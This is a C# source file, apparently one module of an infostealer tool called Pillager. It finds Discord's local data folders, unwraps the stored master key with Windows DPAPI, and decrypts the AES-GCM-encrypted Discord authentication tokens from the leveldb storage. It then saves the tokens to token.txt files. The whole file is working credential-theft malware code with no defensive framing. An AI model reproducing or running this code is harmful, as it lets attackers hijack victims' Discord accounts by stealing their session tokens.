using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Pillager.Messengers
{
    internal class Discord : ICommand
    {
        public Dictionary<string, string> DiscordPaths = new Dictionary<string, string>
        {
            { "Discord", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Discord" )} ,
            { "Discord PTB",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DiscordPTB" )},
            { "Discord Canary", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"DiscordCanary" )} ,
        };

        public byte[] GetMasterKey(string path)
        {
            string filePath = Path.Combine(path, "Local State");
            byte[] masterKey = new byte[] { };
            if (!File.Exists(filePath))
                return null;
            var pattern = new Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath).Replace(" ", ""));
            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value));
            }
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);
            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch
            {
                return null;
            }
        }

        public string GetToken(string path, byte[] key)
        {
            StringBuilder stringBuilder = new StringBuilder();
            string leveldbpath = Path.Combine(path, "Local Storage\\leveldb");
            foreach (string filepath in Directory.GetFiles(leveldbpath, "*.l??"))
            { 
                try
                {
                    string content = File.ReadAllText(filepath);
                    if (key != null)
                    {
                        foreach (object obj in Regex.Matches(content, "dQw4w9WgXcQ:([^.*\\['(.*)'\\].*$][^\"]*)"))
                        {
                            Match match2 = (Match)obj;
                            byte[] buffer = Convert.FromBase64String(match2.Groups[1].Value);
                            byte[] cipherText = buffer.Skip(15).ToArray();
                            byte[] iv = buffer.Skip(3).Take(12).ToArray();
                            byte[] tag = cipherText.Skip(cipherText.Length - 16).ToArray();
                            cipherText = cipherText.Take(cipherText.Length - tag.Length).ToArray();
                            byte[] token = new AesGcm().Decrypt(key, iv, null, cipherText, tag);
                            string decrypted_token = Encoding.UTF8.GetString(token);
                            stringBuilder.AppendLine(decrypted_token);
                        }
                    }
                }
                catch {}
            }
            return stringBuilder.ToString();
        }

        public override void Save(string path)
        {
            foreach (var item in DiscordPaths)
            {
                try
                {
                    byte[] key = GetMasterKey(item.Value);
                    if (key == null) continue;
                    string result = GetToken(item.Value, key);
                    if (string.IsNullOrEmpty(result)) continue;
                    string savepath = Path.Combine(path, item.Key);
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, "token.txt"), result, Encoding.UTF8);
                }
                catch { }
            }
        }
    }
}
